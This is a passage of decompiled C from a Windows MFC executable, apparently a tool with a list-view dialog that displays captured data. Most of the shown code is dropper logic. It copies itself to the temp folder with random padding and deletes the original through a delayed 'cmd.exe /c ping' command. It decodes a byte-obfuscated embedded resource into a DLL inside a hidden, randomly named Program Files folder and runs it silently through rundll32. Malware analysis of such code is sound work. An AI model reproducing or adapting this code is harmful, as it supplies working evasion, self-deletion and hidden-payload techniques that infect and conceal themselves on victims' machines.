    CWnd::MoveWindow((CWnd *)((int)this + 0x60),0,0,0x28,param_3,1);
  }
  iVar1 = FUN_00401890((int)this + 0xa0);
  if (iVar1 != 0) {
    CWnd::MoveWindow((CWnd *)((int)this + 0xa0),0x32,0,300,param_3,1);
  }
  iVar1 = FUN_00401890((int)this + 0xe0);
  if (iVar1 != 0) {
    CWnd::MoveWindow((CWnd *)((int)this + 0xe0),0x168,0,local_1c,param_3,1);
  }
  return;
}



undefined4 __thiscall FUN_00401756(void *this,CDC *param_1,CWnd *param_2,uint param_3)

{
  CDialog::OnCtlColor((CDialog *)this,param_1,param_2,param_3);
  return *(undefined4 *)((int)this + 0x120);
}



CDialog * __thiscall FUN_00401790(void *this,uint param_1)

{
  FUN_004017c0((CDialog *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CDialog *)this;
}



void __fastcall FUN_004017c0(CDialog *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00404884;
  local_10 = ExceptionList;
  local_8 = 2;
  ExceptionList = &local_10;
  CEdit::~CEdit((CEdit *)(param_1 + 0xe0));
  local_8._0_1_ = 1;
  CEdit::~CEdit((CEdit *)(param_1 + 0xa0));
  local_8 = (uint)local_8._1_3_ << 8;
  CEdit::~CEdit((CEdit *)(param_1 + 0x60));
  local_8 = 0xffffffff;
  CDialog::~CDialog(param_1);
  ExceptionList = local_10;
  return;
}



void FUN_00401830(void)

{
  return;
}



void FUN_00401840(void *param_1)

{
  operator_delete(param_1);
  return;
}



void FUN_00401860(void)

{
  return;
}



void FUN_00401870(void)

{
  return;
}



undefined4 __fastcall FUN_00401880(undefined4 *param_1)

{
  return *param_1;
}



undefined4 __fastcall FUN_00401890(int param_1)

{
  undefined4 local_c;
  
  if (param_1 == 0) {
    local_c = 0;
  }
  else {
    local_c = *(undefined4 *)(param_1 + 0x20);
  }
  return local_c;
}



void __thiscall FUN_004018c0(void *this,UINT param_1,WPARAM param_2,LPARAM param_3)

{
  SendMessageA(*(HWND *)((int)this + 0x20),param_1,param_2,param_3);
  return;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnSize(unsigned int,int,int)
// 
// Library: Visual Studio 2010 Debug

void __thiscall CWnd::OnSize(CWnd *this,uint param_1,int param_2,int param_3)

{
  CWnd::Default(this);
  return;
}



void FUN_00401910(void)

{
  return;
}



void __fastcall FUN_00401920(int param_1)

{
  EnableWindow(*(HWND *)(param_1 + 0x20),0);
  return;
}



void __fastcall FUN_00401940(int param_1)

{
  EnableWindow(*(HWND *)(param_1 + 0x20),1);
  return;
}



undefined4 * __fastcall FUN_00401960(undefined4 *param_1)

{
  CWnd::CWnd((CWnd *)param_1);
  *param_1 = &PTR_LAB_004054e8;
  return param_1;
}



CEdit * __thiscall FUN_00401980(void *this,uint param_1)

{
  CEdit::~CEdit((CEdit *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CEdit *)this;
}



void __thiscall FUN_004019b0(void *this,WPARAM param_1,LPARAM param_2,int param_3)

{
  SendMessageA(*(HWND *)((int)this + 0x20),0xb1,param_1,param_2);
  if (param_3 == 0) {
    SendMessageA(*(HWND *)((int)this + 0x20),0xb7,0,0);
  }
  return;
}



void __fastcall FUN_00401a00(int param_1)

{
  SendMessageA(*(HWND *)(param_1 + 0x20),0xce,0,0);
  return;
}



void FUN_00401a30(void)

{
  FUN_00401a3f();
  FUN_00401a50();
  return;
}



void FUN_00401a3f(void)

{
  FUN_00404140(&DAT_004076c8,'\x01');
  return;
}



void FUN_00401a50(void)

{
  FUN_004045ac(FUN_00401a62);
  return;
}



void FUN_00401a62(void)

{
  ~_Timer((undefined4 *)&DAT_004076c8);
  return;
}



undefined * FUN_00401a71(void)

{
  return messageMap_exref;
}



undefined ** FUN_00401a7b(void)

{
  return &PTR_FUN_004055a8;
}



undefined4 * __fastcall FUN_00401a8b(undefined4 *param_1)

{
  int *piVar1;
  
  CWinApp::CWinApp((CWinApp *)param_1,(char *)0x0);
  *param_1 = &PTR_LAB_004055e0;
  piVar1 = (int *)__p___argv();
  if (*(int *)(*piVar1 + 4) != 0) {
    piVar1 = (int *)__p___argv();
    DeleteFileA(*(LPCSTR *)(*piVar1 + 4));
  }
  return param_1;
}



void FUN_00401acc(void)

{
  FUN_00401adb();
  FUN_00401aea();
  return;
}



void FUN_00401adb(void)

{
  FUN_00401a8b((undefined4 *)&DAT_00407600);
  return;
}



void FUN_00401aea(void)

{
  FUN_004045ac(FUN_00401afc);
  return;
}



void FUN_00401afc(void)

{
  FUN_00402610((CWinApp *)&DAT_00407600);
  return;
}



int __cdecl FUN_00401b0b(int param_1,int param_2)

{
  DWORD _Seed;
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int local_2c;
  undefined4 local_28;
  int local_c;
  int local_8;
  
  puVar2 = (undefined4 *)&DAT_00407148;
  puVar3 = &local_28;
  for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)puVar2 + 2);
  _Seed = GetTickCount();
  srand(_Seed);
  local_2c = rand();
  local_2c = local_2c % 10;
  if (local_2c < param_2) {
    local_2c = param_2;
  }
  local_8 = local_2c;
  for (local_c = 0; local_c < local_8; local_c = local_c + 1) {
    iVar1 = rand();
    *(undefined *)(param_1 + local_c) = *(undefined *)((int)&local_28 + iVar1 % 0x1a);
  }
  return local_8;
}



undefined4 __cdecl FUN_00401ba1(int param_1,LPCSTR param_2,int *param_3)

{
  undefined4 uVar1;
  int iVar2;
  undefined1 unaff_BP;
  undefined4 *puVar3;
  size_t local_100c;
  HANDLE local_1008;
  undefined local_1004;
  undefined4 local_1003;
  undefined4 uStackY_28;
  
  FUN_004045d0(unaff_BP);
  local_1004 = 0;
  puVar3 = &local_1003;
  for (iVar2 = 0x3ff; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  *(undefined *)((int)puVar3 + 2) = 0;
  uStackY_28 = 0x401be4;
  local_1008 = CreateFileA(param_2,0x80000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (local_1008 == (HANDLE)0xffffffff) {
    uVar1 = 0;
  }
  else {
    while( true ) {
      local_100c = 0;
      memset(&local_1004,0,0x1000);
      ReadFile(local_1008,&local_1004,0x1000,&local_100c,(LPOVERLAPPED)0x0);
      if (local_100c == 0) break;
      memcpy((void *)(param_1 + *param_3),&local_1004,local_100c);
      *param_3 = *param_3 + local_100c;
    }
    CloseHandle(local_1008);
    uVar1 = 1;
  }
  return uVar1;
}



void FUN_00401c9f(void)

{
  undefined4 *puVar1;
  DWORD DVar2;
  int iVar3;
  DWORD *pDVar4;
  CHAR local_738;
  undefined4 local_737;
  char *local_338;
  HANDLE local_334;
  void *local_330;
  uint local_32c;
  DWORD local_328;
  CHAR local_324;
  undefined4 local_323;
  DWORD local_220;
  char local_21c;
  undefined4 local_21b;
  undefined local_118;
  undefined4 local_117;
  undefined4 local_113;
  undefined4 local_10f;
  undefined2 local_10b;
  undefined local_109;
  CHAR local_108;
  undefined4 local_107;
  
  local_338 = (char *)operator_new(0x100000);
  memset(local_338,0,0x100000);
  local_220 = 0;
  pDVar4 = &local_220;
  puVar1 = (undefined4 *)__p___argv();
  FUN_00401ba1((int)local_338,*(LPCSTR *)*puVar1,(int *)pDVar4);
  while (*local_338 != 'M') {
    pDVar4 = &local_220;
    puVar1 = (undefined4 *)__p___argv();
    FUN_00401ba1((int)local_338,*(LPCSTR *)*puVar1,(int *)pDVar4);
    Sleep(100);
  }
  local_108 = '\0';
  puVar1 = &local_107;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  *(undefined2 *)puVar1 = 0;
  *(undefined *)((int)puVar1 + 2) = 0;
  local_118 = 0;
  local_117 = 0;
  local_113 = 0;
  local_10f = 0;
  local_10b = 0;
  local_109 = 0;
  FUN_00401b0b((int)&local_118,5);
  DVar2 = GetTickCount();
  local_32c = DVar2 % 0x200;
  local_324 = '\0';
  puVar1 = &local_323;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  *(undefined2 *)puVar1 = 0;
  *(undefined *)((int)puVar1 + 2) = 0;
  GetTempPathA(0x104,&local_324);
  wsprintfA(&local_108,s__s__s_exe_00407164,&local_324,&local_118);
  local_334 = CreateFileA(&local_108,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  local_330 = operator_new(local_32c);
  Sleep(100);
  WriteFile(local_334,local_338,local_220,&local_328,(LPOVERLAPPED)0x0);
  Sleep(100);
  WriteFile(local_334,local_330,local_32c,&local_328,(LPOVERLAPPED)0x0);
  CloseHandle(local_334);
  operator_delete(local_330);
  local_330 = (void *)0x0;
  operator_delete(local_338);
  local_338 = (char *)0x0;
  local_738 = '\0';
  puVar1 = &local_737;
  for (iVar3 = 0xff; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  *(undefined2 *)puVar1 = 0;
  *(undefined *)((int)puVar1 + 2) = 0;
  local_21c = '\0';
  puVar1 = &local_21b;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  *(undefined2 *)puVar1 = 0;
  *(undefined *)((int)puVar1 + 2) = 0;
  puVar1 = (undefined4 *)__p___argv();
  strcpy(&local_21c,*(char **)*puVar1);
  wsprintfA(&local_738,s_cmd_exe__c_ping_127_0_0_1__n_2___00407170,&local_108,&local_21c);
  WinExec(&local_738,0);
  Sleep(500);
                    // WARNING: Subroutine does not return
  ExitProcess(0xffffffff);
}



undefined4 FUN_00401f89(void)

{
  return 0;
}



undefined4 FUN_0040206c(void)

{
  byte bVar1;
  byte bVar2;
  HRSRC hResInfo;
  undefined4 uVar3;
  DWORD _Size;
  LPVOID _Src;
  BOOL BVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  LPSTR *ppCVar8;
  CHAR local_5c4;
  undefined4 local_5c3;
  void *local_3c4;
  HANDLE local_3c0;
  DWORD local_3bc;
  uint local_3b8;
  _STARTUPINFOA local_3b4;
  int local_370;
  DWORD local_36c;
  CHAR local_368;
  undefined4 local_367;
  undefined4 local_264 [9];
  undefined local_240;
  undefined4 local_23f;
  undefined4 local_23b;
  undefined4 local_237;
  undefined2 local_233;
  undefined local_231;
  int local_230;
  byte *local_22c;
  uint local_228;
  CHAR local_224;
  undefined4 local_223;
  CHAR local_120;
  undefined4 local_11f;
  byte *local_1c;
  uint local_18;
  _PROCESS_INFORMATION local_14;
  
  hResInfo = FindResourceA((HMODULE)0x0,(LPCSTR)0x94,&DAT_004071b8);
  if (hResInfo == (HRSRC)0x0) {
    uVar3 = 0;
  }
  else {
    local_22c = (byte *)LoadResource((HMODULE)0x0,hResInfo);
    if (local_22c == (byte *)0x0) {
      uVar3 = 0;
    }
    else {
      _Size = SizeofResource((HMODULE)0x0,hResInfo);
      local_1c = local_22c;
      if (local_22c == (byte *)0x0) {
        uVar3 = 0;
      }
      else {
        local_36c = _Size;
        _Src = LockResource(local_22c);
        memcpy(local_1c,_Src,_Size);
        bVar1 = *local_1c;
        local_18 = (uint)bVar1;
        bVar2 = local_1c[1];
        local_228 = (uint)bVar2;
        for (local_230 = 0; local_230 < (int)local_36c; local_230 = local_230 + 1) {
          if (local_230 % 3 == 2) {
            local_1c[local_230] = local_1c[local_230] - bVar1;
          }
          if (local_230 % 3 == 1) {
            local_1c[local_230] = local_1c[local_230] - bVar2;
          }
          if (local_230 % 3 == 0) {
            local_1c[local_230] = local_1c[local_230] - (bVar1 + bVar2);
          }
        }
        local_368 = '\0';
        puVar6 = &local_367;
        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = 0;
        *(undefined *)((int)puVar6 + 2) = 0;
        local_224 = '\0';
        puVar6 = &local_223;
        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = 0;
        *(undefined *)((int)puVar6 + 2) = 0;
        local_240 = 0;
        local_23f = 0;
        local_23b = 0;
        local_237 = 0;
        local_233 = 0;
        local_231 = 0;
        FUN_00401b0b((int)&local_240,5);
        wsprintfA(&local_368,s_d__Program_Files__s_004071bc,&local_240);
        BVar4 = CreateDirectoryA(&local_368,(LPSECURITY_ATTRIBUTES)0x0);
        if (BVar4 == 0) {
          wsprintfA(&local_368,s_c__Program_Files__s_004071d0,&local_240);
          CreateDirectoryA(&local_368,(LPSECURITY_ATTRIBUTES)0x0);
        }
        Sleep(100);
        SetFileAttributesA(&local_368,2);
        memset(&local_240,0,0x10);
        FUN_00401b0b((int)&local_240,5);
        wsprintfA(&local_224,s__s__s_dll_004071e4,&local_368,&local_240);
        local_3c0 = CreateFileA(&local_224,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,
                                (HANDLE)0x0);
        WriteFile(local_3c0,local_1c,local_36c,&local_3bc,(LPOVERLAPPED)0x0);
        iVar5 = rand();
        local_3b8 = iVar5 % 0xff;
        local_3c4 = operator_new(local_3b8);
        for (local_370 = 0; local_370 < (int)local_3b8; local_370 = local_370 + 1) {
          iVar5 = rand();
          *(char *)((int)local_3c4 + local_370) = (char)(iVar5 % (local_370 + 0xfa));
        }
        WriteFile(local_3c0,local_3c4,local_3b8,&local_3bc,(LPOVERLAPPED)0x0);
        SetFilePointer(local_3c0,0,(PLONG)0x0,0);
        WriteFile(local_3c0,&DAT_004071f0,2,&local_3bc,(LPOVERLAPPED)0x0);
        CloseHandle(local_3c0);
        puVar6 = (undefined4 *)s_c__windows_system32_rundll32_exe_004071f4;
        puVar7 = local_264;
        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar7 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar7 = puVar7 + 1;
        }
        *(undefined2 *)puVar7 = *(undefined2 *)puVar6;
        local_5c4 = '\0';
        puVar6 = &local_5c3;
        for (iVar5 = 0x7f; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = 0;
        *(undefined *)((int)puVar6 + 2) = 0;
        local_120 = '\0';
        puVar6 = &local_11f;
        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = 0;
        *(undefined *)((int)puVar6 + 2) = 0;
        GetModuleFileNameA((HMODULE)0x0,&local_120,0x104);
        wsprintfA(&local_5c4,s__s___s__InitEngine__s_00407218,local_264,&local_224,&local_120);
        ppCVar8 = &local_3b4.lpReserved;
        for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {
          *ppCVar8 = (LPSTR)0x0;
          ppCVar8 = ppCVar8 + 1;
        }
        local_3b4.cb = 0x44;
        local_3b4.lpDesktop = s_WinSta0_Default_00407230;
        local_3b4.wShowWindow = 0;
        CreateProcessA((LPCSTR)0x0,&local_5c4,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                       0,0,(LPVOID)0x0,(LPCSTR)0x0,&local_3b4,&local_14);
        uVar3 = 1;
      }
    }
  }
  return uVar3;
}



undefined4 __fastcall FUN_00402520(int param_1)

{
  int *piVar1;
  int iVar2;
  CDialog local_130 [284];
  int local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0040489c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  piVar1 = (int *)__p___argv();
  if (*(int *)(*piVar1 + 4) == 0) {
    FUN_00401c9f();
  }
  iVar2 = FUN_0040206c();
  if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
    ExitProcess(0xffffffff);
  }
  AfxEnableControlContainer((COccManager *)0x0);
  FUN_00402798(local_130,(CWnd *)0x0);
  local_8 = 0;
  *(CDialog **)(param_1 + 0x20) = local_130;
  local_14 = CDialog::DoModal(local_130);
  local_8 = 0xffffffff;
  FUN_00402630(local_130);
  ExceptionList = local_10;
  return 0;
}



CWinApp * __thiscall FUN_004025e0(void *this,uint param_1)

{
  FUN_00402610((CWinApp *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CWinApp *)this;
}



void __fastcall FUN_00402610(CWinApp *param_1)

{
  CWinApp::~CWinApp(param_1);
  return;
}



void __fastcall FUN_00402630(CDialog *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004048d4;
  local_10 = ExceptionList;
  local_8 = 2;
  ExceptionList = &local_10;
  FUN_004038f7((undefined4 *)(param_1 + 0xe4));
  local_8._0_1_ = 1;
  CListCtrl::~CListCtrl((CListCtrl *)(param_1 + 0xa0));
  local_8 = (uint)local_8._1_3_ << 8;
  CButton::~CButton((CButton *)(param_1 + 0x60));
  local_8 = 0xffffffff;
  CDialog::~CDialog(param_1);
  ExceptionList = local_10;
  return;
}



void FUN_004026a0(void)

{
  FUN_004026af();
  FUN_004026c0();
  return;
}



void FUN_004026af(void)

{
  FUN_00404140(&DAT_004076d0,'\x01');
  return;
}



void FUN_004026c0(void)

{
  FUN_004045ac(FUN_004026d2);
  return;
}



void FUN_004026d2(void)

{
  ~_Timer((undefined4 *)&DAT_004076d0);
  return;
}



undefined4 * __fastcall FUN_004026e1(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004048f5;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CDialog::CDialog((CDialog *)param_1,100,(CWnd *)0x0);
  local_8 = 0;
  CString::CString((CString *)(param_1 + 0x18));
  local_8 = CONCAT31(local_8._1_3_,1);
  *param_1 = &PTR_LAB_00405788;
  CString::operator=((CString *)(param_1 + 0x18),s_RedTom21_HotMail_com_00407330);
  ExceptionList = local_10;
  return param_1;
}



void __thiscall FUN_00402750(void *this,CDataExchange *param_1)

{
  FUN_00401910();
  DDX_Text(param_1,0x3f2,(CString *)((int)this + 0x60));
  return;
}



undefined * FUN_0040277e(void)

{
  return messageMap_exref;
}



undefined ** FUN_00402788(void)

{
  return &PTR_FUN_00405688;
}



undefined4 * __thiscall FUN_00402798(void *this,CWnd *param_1)

{
  undefined4 uVar1;
  uint uVar2;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404932;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CDialog::CDialog((CDialog *)this,0x66,param_1);
  local_8 = 0;
  FUN_00403650((undefined4 *)((int)this + 0x60));
  local_8._0_1_ = 1;
  FUN_004036d0((undefined4 *)((int)this + 0xa0));
  local_8._0_1_ = 2;
  __crt_win32_buffer<>((undefined4 *)((int)this + 0xe4));
  local_8 = CONCAT31(local_8._1_3_,3);
  *(undefined4 *)((int)this + 0xfe) = 0;
  *(undefined ***)this = &PTR_LAB_00405860;
  uVar2 = 0x80;
  FUN_00403450();
  uVar1 = FUN_004036a0(uVar2);
  *(undefined4 *)((int)this + 0xe0) = uVar1;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



void __thiscall FUN_00402846(void *this,CDataExchange *param_1)

{
  FUN_00401910();
  DDX_Control(param_1,0x3ea,(CWnd *)((int)this + 0x60));
  DDX_Control(param_1,1000,(CWnd *)((int)this + 0xa0));
  return;
}



undefined * FUN_0040288b(void)

{
  return messageMap_exref;
}



undefined ** FUN_00402895(void)

{
  return &PTR_FUN_004056a8;
}



undefined4 __fastcall FUN_004028a5(CDialog *param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  LPCSTR pCVar2;
  void *this;
  undefined4 *local_30;
  int local_20;
  uint local_1c;
  void *local_18;
  uint local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0040494f;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CDialog::OnInitDialog(param_1);
  local_18 = (void *)FUN_00403540(param_1,0);
  if (local_18 != (void *)0x0) {
    CString::CString((CString *)&local_20);
    local_8 = 0;
    CString::LoadStringA((CString *)&local_20,0x65);
    bVar1 = FUN_00403410(&local_20);
    if (CONCAT31(extraout_var,bVar1) == 0) {
      FUN_00403510(local_18,0x800,0,(LPCSTR)0x0);
      pCVar2 = (LPCSTR)FUN_00401880(&local_20);
      FUN_00403510(local_18,0,0x10,pCVar2);
    }
    local_8 = 0xffffffff;
    CString::~CString((CString *)&local_20);
  }
  FUN_004035b0(param_1,*(LPARAM *)(param_1 + 0xe0),1);
  FUN_004035b0(param_1,*(LPARAM *)(param_1 + 0xe0),0);
  this = (void *)FUN_004033f0(0x126);
  local_8 = 1;
  if (this == (void *)0x0) {
    local_30 = (undefined4 *)0x0;
  }
  else {
    local_30 = FUN_00401000(this,(CWnd *)0x0);
  }
  local_8 = 0xffffffff;
  *(undefined4 **)(param_1 + 0xfe) = local_30;
  FUN_00403620(*(void **)(param_1 + 0xfe),0x82,(CWnd *)param_1);
  FUN_00403128(param_1);
  CWnd::ShowWindow(*(CWnd **)(param_1 + 0xfe),5);
  local_1c = FUN_004018c0(param_1 + 0xa0,0x1037,0,0);
  local_1c = local_1c | 0x31;
  FUN_004018c0(param_1 + 0xa0,0x1036,0,local_1c);
  local_14 = FUN_00403810((int)(param_1 + 0xa0));
  FUN_004037e0(param_1 + 0xa0,local_14 | 0x100);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),0,&DAT_00407348,0,0x28,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),1,&DAT_00407350,0,0x8c,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),2,&DAT_00407358,0,0x8c,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),3,&DAT_00407360,0,0x37,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),4,&DAT_00407368,0,100,-1);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x102));
  ExceptionList = local_10;
  return 1;
}



void __thiscall FUN_00402aea(void *this,uint param_1)

{
  undefined4 local_74 [25];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404962;
  local_10 = ExceptionList;
  if ((param_1 & 0xfff0) == 0x10) {
    ExceptionList = &local_10;
    FUN_004026e1(local_74);
    local_8 = 0;
    CDialog::DoModal((CDialog *)local_74);
    local_8 = 0xffffffff;
    FUN_00403340((CDialog *)local_74);
  }
  else {
    ExceptionList = &local_10;
    FUN_00403600((CWnd *)this);
  }
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00402b5d(CWnd *param_1)

{
  int iVar1;
  WPARAM WVar2;
  int iVar3;
  LPARAM LVar4;
  CPaintDC local_80 [84];
  int local_2c;
  int local_28;
  int local_24;
  tagRECT local_20;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404975;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = FUN_00403570((int)param_1);
  if (iVar1 == 0) {
    FUN_004035e0(param_1);
  }
  else {
    CPaintDC::CPaintDC(local_80,param_1);
    local_8 = 0;
    LVar4 = 0;
    WVar2 = FUN_004034b0((int)local_80);
    FUN_004018c0(param_1,0x27,WVar2,LVar4);
    iVar1 = GetSystemMetrics(0xb);
    local_24 = GetSystemMetrics(0xc);
    FUN_00403460(&local_20);
    FUN_00403590(param_1,&local_20);
    iVar3 = FUN_00403470(&local_20.left);
    local_28 = ((iVar3 - iVar1) + 1) / 2;
    iVar1 = FUN_00403490((int)&local_20);
    local_2c = ((iVar1 - local_24) + 1) / 2;
    FUN_004034e0(local_80,local_28,local_2c,*(HICON *)(param_1 + 0xe0));
    local_8 = 0xffffffff;
    CPaintDC::~CPaintDC(local_80);
  }
  ExceptionList = local_10;
  return;
}



undefined4 __fastcall FUN_00402c5f(int param_1)

{
  return *(undefined4 *)(param_1 + 0xe0);
}



void __fastcall FUN_00402c73(CDialog *param_1)

{
  CDialog::OnOK(param_1);
  return;
}



void __fastcall FUN_00402c86(CDialog *param_1)

{
  CDialog::OnCancel(param_1);
  return;
}



void __fastcall FUN_00402c99(CWnd *param_1)

{
  CWnd::OnDestroy(param_1);
  if (*(int *)(param_1 + 0xfe) != 0) {
    (**(code **)(**(int **)(param_1 + 0xfe) + 0x60))();
    if (*(int **)(param_1 + 0xfe) != (int *)0x0) {
      (**(code **)(**(int **)(param_1 + 0xfe) + 4))(1);
    }
  }
  FUN_00402d19((int)param_1);
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x102));
  return;
}



void __fastcall FUN_00402d19(int param_1)

{
  void *pvVar1;
  WPARAM local_8;
  
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x102));
  local_8 = FUN_00403720(param_1 + 0xa0);
  while (local_8 = local_8 - 1, -1 < (int)local_8) {
    pvVar1 = (void *)CListCtrl::GetItemData((CListCtrl *)(param_1 + 0xa0),local_8);
    if (pvVar1 != (void *)0x0) {
      operator_delete(*(void **)((int)pvVar1 + 4));
      operator_delete(pvVar1);
    }
    FUN_004037b0((void *)(param_1 + 0xa0),local_8);
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x102));
  return;
}



void FUN_00402dc6(int param_1,byte *param_2,uint param_3)

{
  char *pcVar1;
  undefined4 *puVar2;
  void *pvVar3;
  int iVar4;
  uint *local_b0;
  char local_94;
  undefined4 local_93;
  char local_74 [32];
  _SYSTEMTIME local_54;
  int local_44;
  int local_40;
  int local_3c;
  undefined4 local_38;
  char local_34;
  undefined4 local_33;
  undefined *local_14;
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404996;
  pvStack_10 = ExceptionList;
  local_14 = &stack0xffffff40;
  local_3c = param_1;
  local_94 = '\0';
  puVar2 = &local_93;
  for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  local_34 = '\0';
  puVar2 = &local_33;
  for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  ExceptionList = &pvStack_10;
  FUN_00403cbb(param_2,param_3,local_74,&local_94,&local_34,&local_40);
  EnterCriticalSection((LPCRITICAL_SECTION)(local_3c + 0x102));
  CString::CString((CString *)&local_38);
  local_8 = 0;
  local_44 = FUN_00403720(local_3c + 0xa0);
  FUN_00403780((void *)(local_3c + 0xa0),local_44,local_74);
  CListCtrl::SetItemText((CListCtrl *)(local_3c + 0xa0),local_44,1,&local_94);
  CListCtrl::SetItemText((CListCtrl *)(local_3c + 0xa0),local_44,2,&local_34);
  CString::Format((CString *)&local_38,(char *)&local_38);
  pcVar1 = (char *)FUN_00401880(&local_38);
  CListCtrl::SetItemText((CListCtrl *)(local_3c + 0xa0),local_44,3,pcVar1);
  GetSystemTime(&local_54);
  CString::Format(local_54.wDay,(char *)&local_38);
  pcVar1 = (char *)FUN_00401880(&local_38);
  CListCtrl::SetItemText((CListCtrl *)(local_3c + 0xa0),local_44,4,pcVar1);
  FUN_00403750((void *)(local_3c + 0xa0),local_44,0);
  local_8._0_1_ = 1;
  puVar2 = (undefined4 *)operator_new(8);
  local_8._0_1_ = 2;
  if (puVar2 == (undefined4 *)0x0) {
    local_b0 = (uint *)0x0;
  }
  else {
    local_b0 = FUN_004033c0(puVar2);
  }
  local_8 = CONCAT31(local_8._1_3_,1);
  *local_b0 = param_3;
  pvVar3 = operator_new(param_3);
  local_b0[1] = (uint)pvVar3;
  memcpy((void *)local_b0[1],param_2,param_3);
  FUN_00403750((void *)(local_3c + 0xa0),local_44,(long)local_b0);
  FUN_00403057();
  return;
}



undefined * Catch_00403051(void)

{
  return FUN_00403057;
}



void FUN_00403057(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -4) = 0;
  LeaveCriticalSection((LPCRITICAL_SECTION)(*(int *)(unaff_EBP + -0x38) + 0x102));
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x34));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void __fastcall FUN_0040308e(CWnd *param_1)

{
  CWnd *this;
  
  this = CWnd::GetDlgItem(param_1,0x3ea);
  if (DAT_004076d8 == 0) {
    FUN_00403913(param_1 + 0xe4,param_1,FUN_00402dc6);
    FUN_004039d5(param_1 + 0xe4,0xddd5);
    if (this != (CWnd *)0x0) {
      CWnd::SetWindowTextA(this,&DAT_00407398);
    }
  }
